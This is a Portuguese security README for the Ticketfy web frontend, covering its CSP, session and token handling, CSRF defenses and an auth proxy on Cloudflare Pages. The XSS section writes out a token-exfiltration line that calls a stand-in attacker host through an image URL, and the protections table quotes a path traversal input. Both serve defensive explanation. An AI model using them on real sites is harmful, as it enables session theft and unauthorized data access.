# Segurança do Ticketfy Web

Regra de ouro: **quem protege é a API.** O frontend roda no computador do usuário e pode ser alterado por ele. Tudo o que está aqui serve para não deixar a interface ser usada contra o usuário e para dificultar abusos simples, nunca para substituir a validação do backend.

## O que o frontend faz

| Proteção | Onde | Contra o quê |
|---|---|---|
| Content-Security-Policy rígida (sem script inline, sem `unsafe-inline` em estilos, Trusted Types) | `vite.config.ts` | XSS: script injetado não executa. **Não** impede que dados saiam da página (veja "Sessão") |
| `frame-ancestors 'none'` e `X-Frame-Options: DENY` | `dist/_headers` | Clickjacking (site aberto escondido dentro de um iframe) |
| `Referrer-Policy: no-referrer` | `index.html` e `_headers` | Vazamento do endereço da página para sites de imagens e mapas |
| Access token só em memória (some ao recarregar) e refresh token em cookie `HttpOnly` que o JavaScript não lê | `src/api/client.ts`, API | Roubo de credencial de longa duração por XSS |
| Logout por inatividade (30 min, compartilhado entre abas) com revogação no servidor | `src/auth/AuthContext.tsx` | Computador compartilhado |
| Cache das consultas limpo no login/logout e `cache: "no-store"` em requisições logadas | `AuthContext.tsx`, `api/client.ts` | Dados de um usuário aparecendo para o próximo |
| `credentials: "omit"` nas chamadas à API; o cookie só vai para `/api/auth/*` e `/api/users/me/password`, na mesma origem | `src/api/client.ts` | CSRF nas rotas comuns (não recebem cookie) |
| Chamadas de autenticação com `X-Ticketfy-Auth: 1`, `Origin` conferido na Function e na API, cookie `SameSite=Strict` | `functions/`, API | CSRF e login CSRF nas rotas que leem o cookie |
| Tempo limite de 15 s nas requisições | `src/api/client.ts` | Tela travada em "carregando" |
| IDs da URL validados e codificados antes de virar rota da API | `utils/security.ts` (`isValidId`), `api/endpoints.ts` (`seg`) | Path traversal: `/events/..%2Fusers%2Fme` |
| Destino pós-login só pode ser página do próprio site | `utils/security.ts` (`safeRedirectPath`) | Open redirect usado em phishing |
| Foto do evento só em `https://`, sem usuário/senha na URL, com `referrerPolicy="no-referrer"` | `utils/security.ts` (`safeImageUrl`), `components/EventCover.tsx` | `javascript:`/`data:` em imagens, conteúdo misto |
| Carrinho da URL validado (IDs, quantidades, repetições, tamanho) | `utils/cart.ts` | URL editada para quantidades absurdas |
| Freio de tentativas no login (bloqueio crescente após 5 erros) e mensagem genérica | `pages/LoginPage.tsx` | Chute de senhas pela tela, descobrir quais e-mails têm conta |
| Medidor de força de senha e lista de senhas comuns | `pages/RegisterPage.tsx` | Senhas fracas |
| Chave de idempotência gerada com `crypto` | `utils/idempotency.ts` | Pedido duplicado por clique duplo |
| Links externos com `rel="noopener noreferrer"` | `pages/EventDetailPage.tsx` | Tabnabbing |
| Build falha se a API de produção não for https | `vite.config.ts` | Senha trafegando sem criptografia |
| Sem source maps no build | `vite.config.ts` | Publicar o código-fonte original |

## Sessão

**Como funciona**

- O login (`POST /api/auth/login`) devolve um access token (JWT de 10 min) no corpo e grava o refresh token no cookie `__Host-ticketfy_rt` (`HttpOnly; Secure; SameSite=Strict; Path=/`). Em dev o cookie se chama `ticketfy_rt` e não é `Secure`.
- O access token fica **só em memória** (`src/api/client.ts`). Nada de `sessionStorage` nem `localStorage`. No `localStorage` ficam apenas dois indicadores não secretos: `ticketfy.hasSession` (existe uma sessão para tentar renovar) e `ticketfy.lastActivity` (horário da última atividade, compartilhado entre as abas).
- Ao abrir a página, o front só chama `/api/auth/refresh` se existir `ticketfy.hasSession`. Visitantes anônimos não acordam a API. Enquanto a renovação não termina, as rotas privadas mostram "carregando". As páginas públicas não esperam.
- A sessão é renovada cerca de 60 s antes do vencimento, e só se houve atividade desde a última renovação. Quem fica parado expira também no servidor (refresh com 30 min de inatividade e limite absoluto de 12 h).
- Um 401 numa chamada que levou token dispara **uma** renovação e **uma** repetição da requisição. Chamadas de autenticação nunca disparam renovação. Se a renovação receber 401 ou 403, a sessão encerra em todas as abas. Uma falha temporária (rede, 5xx, 429) só faz a requisição falhar, sem encerrar a sessão e sem nova tentativa.
- **Várias abas:** toda renovação passa por `navigator.locks` (`ticketfy-refresh`), então duas renovações nunca correm juntas e não há reutilização acidental do refresh token. Dentro de cada aba existe uma única promessa de renovação. O `BroadcastChannel("ticketfy-auth")` avisa as outras abas de `login`, `logout` e `refreshed` (com o access token novo).
- **Inatividade:** 30 min sem atividade em nenhuma aba encerram a sessão. A aba que detecta chama `/api/auth/logout` e avisa as outras.
- **Logout:** `POST /api/auth/logout` com `keepalive`, depois a memória, o cache do React Query e o indicador são limpos. A tela de conta tem "Sair de todos os dispositivos" (`/api/auth/logout-all`) e a troca de senha (`PATCH /api/users/me/password`). A troca de senha encerra as outras sessões e mantém esta.

**Proxy na Cloudflare Pages**

`pages.dev` e `onrender.com` estão na Public Suffix List, então um cookie da API seria cookie de terceiro (o Safari bloqueia). Por isso as rotas que usam o cookie passam por Pages Functions na mesma origem do site:

- `functions/api/auth/[[path]].ts` e `functions/api/users/me/password.ts`, com a lógica em `functions/_lib/authProxy.ts`. O `public/_routes.json` faz a Function rodar só nesses caminhos. O resto do site continua estático, e as demais chamadas vão direto ao Render com Bearer.
- A Function aceita só `POST` em `login`, `refresh`, `logout` e `logout-all` e `PATCH` em `users/me/password`. Ela recusa `Origin` diferente do próprio site e corpo acima de 8 KB, e não repassa a query string.
- Repassa à API só `Cookie` (apenas o `__Host-ticketfy_rt`), `Content-Type`, `Authorization`, `Origin`, `X-Ticketfy-Auth` e `X-Request-Id`. Acrescenta `X-Proxy-Secret` e `X-Client-IP` (de `CF-Connecting-IP`), para o limite de tentativas de login contar por usuário e não pelo IP da Cloudflare.
- Devolve só `Content-Type`, `Set-Cookie`, `Retry-After` e `X-Request-Id`, sempre com `Cache-Control: no-store`.
- `API_ORIGIN` e `PROXY_SHARED_SECRET` vêm das variáveis de ambiente da Pages. Sem elas, ou com `API_ORIGIN` sem https, a Function responde 500 e não repassa nada. Configure o segredo só no ambiente Production: assim os deploys de preview não fazem login na API de produção.
- Em dev, o `server.proxy` do `vite.config.ts` imita a Function e aponta para `http://localhost:8080` (sem o segredo).

**O que continua em aberto (XSS)**

A versão anterior deste documento dizia que a CSP impede um script malicioso de mandar o token para fora. **Isso não é verdade.** O `connect-src` bloqueia `fetch` para outros domínios, mas `img-src 'self' data: https:` permite `new Image().src = "https://atacante/?t=" + token`, e uma navegação (`location = ...`) também leva dados para fora.

O que mudou com a sessão nova: o refresh token não pode ser lido pelo JavaScript, e o access token vale só 10 min e é revogado no logout. Um XSS ainda consegue agir como o usuário **enquanto a página está aberta**, inclusive renovando a sessão, mas não leva nenhuma credencial que dure. A CSP e o escape do React continuam sendo a defesa principal contra o XSS em si.

O `img-src https:` existe porque as fotos de eventos e de perfil são URLs externas. Ele **será fechado no item de upload de foto**, quando as imagens passarem a vir de um storage próprio com origem fixa.

## O que precisa estar na API (o frontend não resolve)

- Limite de tentativas de login por IP e por e-mail, respondendo `429`. Atrás do proxy, o IP vem de `X-Client-IP`, aceito só com `X-Proxy-Secret` correto.
- Conferir dono do recurso em toda rota (`/orders/{id}`, `/events/{id}` PUT/DELETE, check-in).
- Calcular preço e total no servidor; ignorar qualquer valor vindo do cliente.
- Validar `imageUrl` (só `https://`, tamanho máximo) com Bean Validation.
- CORS liberando só o domínio do frontend, não `*`.
- Mensagem de erro de login igual para "e-mail não existe" e "senha errada".

## Cabeçalhos na hospedagem

O build gera `dist/_headers`, que **Netlify** e **Cloudflare Pages** aplicam sozinhos.

Em outras hospedagens, copie os valores de `dist/_headers` para a configuração delas:

- **Render (Static Site):** em Settings → Headers, crie uma regra para `/*` com cada cabeçalho.
- **Vercel:** use a chave `headers` no `vercel.json`.

Também é preciso configurar o redirecionamento de todas as rotas para `/index.html` (rewrite), senão recarregar uma página como `/tickets` dá 404.

As Functions de `functions/` e o `public/_routes.json` só funcionam na **Cloudflare Pages**. Em outra hospedagem, as rotas `/api/auth/*` e `/api/users/me/password` precisam de um proxy equivalente na mesma origem.

Para conferir, abra o site publicado, aperte F12, vá na aba Network, clique na primeira requisição e veja os Response Headers.

## Aviso sobre fotos externas

Como a foto é uma URL de outro site, esse site fica sabendo o IP de quem viu o evento (o `no-referrer` esconde de qual página, mas não o acesso em si). Para eliminar isso, o caminho seria o backend receber o upload e guardar a imagem num storage próprio (S3, Cloudinary).
